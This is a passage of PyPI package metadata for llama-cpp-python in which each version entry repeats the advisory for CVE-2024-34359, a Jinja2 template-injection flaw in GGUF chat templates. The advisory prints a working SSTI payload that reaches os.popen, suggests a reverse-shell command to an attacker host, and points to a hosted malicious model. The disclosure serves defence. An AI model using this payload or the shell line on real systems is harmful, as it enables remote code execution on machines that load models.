library","version":"0.2.53","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"61a16a4f3df444ddd3903d07d35f3ef7a2a2f2711ced64944fd5ee3f0ed1ef39","md5":"55d542b632def36e5c0b3c081d82443c","sha256":"f7ff8eda538ca6c80521a8bbf80d3ef4527ecb28f6d08fa9b3bb1f0cfc3b684e"},"downloads":-1,"filename":"llama_cpp_python-0.2.53.tar.gz","has_sig":false,"md5_digest":"55d542b632def36e5c0b3c081d82443c","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36781720,"upload_time":"2024-02-28T06:40:45","upload_time_iso_8601":"2024-02-28T06:40:45.004486Z","url":"https://files.pythonhosted.org/packages/61/a1/6a4f3df444ddd3903d07d35f3ef7a2a2f2711ced64944fd5ee3f0ed1ef39/llama_cpp_python-0.2.53.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.54":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.54/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.54","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"1ee25227d3fdb81aa6d3db68f240a2f5a462f229ebac7535087f5040d253fca4","md5":"0e0b978019890d799c93236ad9321e80","sha256":"12917027ca25b7cde8d333056ce2d478a9bbb7135f1f026b95885d7deca972b6"},"downloads":-1,"filename":"llama_cpp_python-0.2.54.tar.gz","has_sig":false,"md5_digest":"0e0b978019890d799c93236ad9321e80","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36901106,"upload_time":"2024-03-01T18:17:36","upload_time_iso_8601":"2024-03-01T18:17:36.589603Z","url":"https://files.pythonhosted.org/packages/1e/e2/5227d3fdb81aa6d3db68f240a2f5a462f229ebac7535087f5040d253fca4/llama_cpp_python-0.2.54.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.55":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.55/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.55","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"73187154fde7dfa9218f7f72784865d76cbfe2553adce0c35cfc8a9cbcd635b3","md5":"b5e0e495b6a75f805f3fd893454e1c1c","sha256":"68fb1bf4edb6efe9dc8a91d5d08a73cc379558571dd876acffd9cdebfbba9263"},"downloads":-1,"filename":"llama_cpp_python-0.2.55.tar.gz","has_sig":false,"md5_digest":"b5e0e495b6a75f805f3fd893454e1c1c","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36820206,"upload_time":"2024-03-03T03:50:46","upload_time_iso_8601":"2024-03-03T03:50:46.814355Z","url":"https://files.pythonhosted.org/packages/73/18/7154fde7dfa9218f7f72784865d76cbfe2553adce0c35cfc8a9cbcd635b3/llama_cpp_python-0.2.55.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and 